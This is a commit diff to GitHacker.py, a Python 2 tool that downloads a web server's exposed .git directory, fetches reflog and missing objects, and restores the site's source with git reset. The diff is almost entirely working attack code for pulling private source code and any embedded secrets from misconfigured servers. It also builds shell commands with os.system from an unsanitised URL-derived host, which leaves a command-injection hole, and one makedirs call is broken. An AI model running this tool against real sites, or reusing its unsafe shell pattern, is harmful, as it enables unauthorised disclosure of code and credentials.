a6d002cc0f730360ab186578e7ad5d03f8a1fdaa
WangYihang <wangyihanger@gmail.com>
2017-04-08 03:27:06 +0000

    perfect

--- GitHacker.py
+++ GitHacker.py
@@ -23,6 +23,7 @@ def downloadFile(url, path):
         os.makedirs(folder)
     except:
         print "[-] Folder already existed!"
+    print "[!] Getting -> %s" % (url)
     response = requests.get(url)
     if response.status_code == 200:
         with open(path, "wb") as f:
@@ -32,6 +33,31 @@ def downloadFile(url, path):
     else:
         print "[-] [%d]" % (response.status_code)
 
+
+def fixmissing(temppath):
+    # get missing files
+    os.system("cd ./%s ; git fsck --name-objects > ../cache.dat" % temppath)
+    missing = []
+    with open("./cache.dat", "r") as f:
+        for line in f:
+            missing.append(line.split(" (")[0].split(" ")[-1])
+
+    length = len(missing)
+    # clean cache file
+    os.system("rm ./cache.dat")
+
+    # download missing files
+    for i in missing:
+        path = "./%s/.git/objects/%s/%s" % (temppath, i[0:2], i[2:])
+        url = "http://%s/.git/objects/%s/%s" % (temppath, i[0:2], i[2:])
+        downloadFile(url, path)
+    if length > 1:
+        fixmissing(temppath)
+    else:
+        return
+
+
+
 def main():
     if len(sys.argv) != 2:
         print "Usage : "
@@ -39,15 +65,37 @@ def main():
         exit(1)
     files = dirlist("./", [])
     baseurl = sys.argv[1]
+    print baseurl
     temppath = baseurl.split("http://")[1].split("/")[0]
+
+    # download base files
     for i in files:
         if i.startswith("./.git"):
             path = "./%s/%s" % (temppath, i[2:])
             url = baseurl + i[2:]
             downloadFile(url, path)
-    master = open("./%s/.git/log/" % temppath, "r")
+
+
+
+    # download baseobject files
+    master = open("./%s/.git/logs/refs/heads/master" % temppath, "r")
+    print "[!] Downloading object files"
     for line in master:
-        print line
+        prehash = line.split(" ")[0]
+        nexthash = line.split(" ")[1]
+        path = "./%s/.git/objects/%s/%s" % (temppath, nexthash[0:2], nexthash[2:])
+        url = "http://%s/.git/objects/%s/%s" % (temppath, nexthash[0:2], nexthash[2:])
+        try:
+            os.makedirs("./%s/%s", (temppath, path))
+        except:
+            print "[-] Folder already existed!"
+        downloadFile(url, path)
+
+    # download missing files
+    fixmissing(temppath)
+
+    # git reset to the last commit
+    os.system("cd ./%s; git reset --hard;" % temppath)
 
 if __name__ == "__main__":
     main()
